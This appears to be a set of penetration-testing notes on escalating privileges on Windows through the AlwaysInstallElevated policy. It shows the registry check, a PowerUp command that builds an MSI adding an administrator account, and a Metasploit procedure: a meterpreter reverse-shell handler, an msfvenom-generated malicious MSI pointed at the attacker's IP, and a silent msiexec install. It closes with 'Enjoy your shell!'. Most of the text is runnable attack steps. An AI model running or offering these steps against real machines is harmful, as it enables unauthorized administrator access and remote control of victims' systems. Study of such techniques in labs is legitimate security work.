# AllWaysInstalled Elevated

1.Open command prompt and type:&#x20;

`reg query HKLM\Software\Policies\Microsoft\Windows\Installer`&#x20;

2.From the output, notice that “AlwaysInstallElevated” value is 1.&#x20;

If 1 We can abuse this

Again open powerup

```
powershell -ep bypass
```

```
. .\PowerUp.ps1
```

```
Write-UserAddMSI
```

It creates an malicious script using powerup

Then run the script ,this creates an new user in admin group

then recconect to that user using rdp

OR\
2\. In Metasploit (msf > prompt) type: use multi/handler\
3\. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse\_tcp\
4\. In Metasploit (msf > prompt) type: set lhost \[Kali VM IP Address]\
5\. In Metasploit (msf > prompt) type: run\
6\. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse\_tcp lhost=\[Kali VM IP Address] -f msi -o setup.msi\
7\. Copy the generated file, setup.msi, to the Windows VM.\


Windows VM

1.Place ‘setup.msi’ in ‘C:\Temp’.\
2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi\


Enjoy your shell! :)
